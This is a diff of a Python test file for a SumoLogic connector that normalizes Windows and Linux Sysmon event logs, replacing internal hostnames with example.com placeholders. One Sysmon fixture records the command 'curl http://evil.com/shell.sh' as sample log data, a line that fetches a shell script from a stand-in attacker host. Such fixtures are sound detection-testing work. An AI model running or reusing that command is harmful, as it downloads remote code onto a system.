@@ -247,7 +247,7 @@ class TestNormalizeWindowsEvent:
         """Event ID 4624 should normalize to action=login."""
         event = {
             "system_time": "2026-04-30T20:00:00.000Z",
-            "computer": "DC01.qfunction.ai",
+            "computer": "DC01.example.com",
             "event_id": {"id": 4624},
             "event_data": {
                 "TargetUserName": "admin",
@@ -319,12 +319,12 @@ class TestNormalizeWindowsEvent:
         """Computer FQDN should be stripped to short name."""
         event = {
             "system_time": "2026-04-30T20:00:00.000Z",
-            "computer": "EC2AMAZ-OCPNFK9.qfunction.ai",
+            "computer": "WIN-SRV01.example.com",
             "event_id": {"id": 4624},
             "event_data": {},
         }
         result = SumoLogicConnector._normalize_windows_event(event, "auth")
-        assert result["host"] == "EC2AMAZ-OCPNFK9"
+        assert result["host"] == "WIN-SRV01"
 
     def test_endpoint_sysmon_image(self):
         """Endpoint events should extract process from Image field."""
@@ -415,7 +415,7 @@ class TestNormalizeLinuxSysmonXml:
             'Apr 30 19:51:24 hostname sysmon[1234]: '
             '<Event><System><EventID>1</EventID>'
             '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
-            '<Computer>hostname.qfunction.ai</Computer>'
+            '<Computer>hostname.example.com</Computer>'
             '</System><EventData>'
             '<Data Name="Image">/usr/bin/curl</Data>'
             '<Data Name="CommandLine">curl http://evil.com/shell.sh</Data>'
@@ -538,7 +538,7 @@ class TestNormalizeLinuxSysmonXml:
         raw = (
             '<Event><System><EventID>1</EventID>'
             '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
-            '<Computer>web01.qfunction.ai</Computer>'
+            '<Computer>web01.example.com</Computer>'
             '</System><EventData>'
             '<Data Name="Image">/usr/bin/ls</Data>'
             '</EventData></Event>'
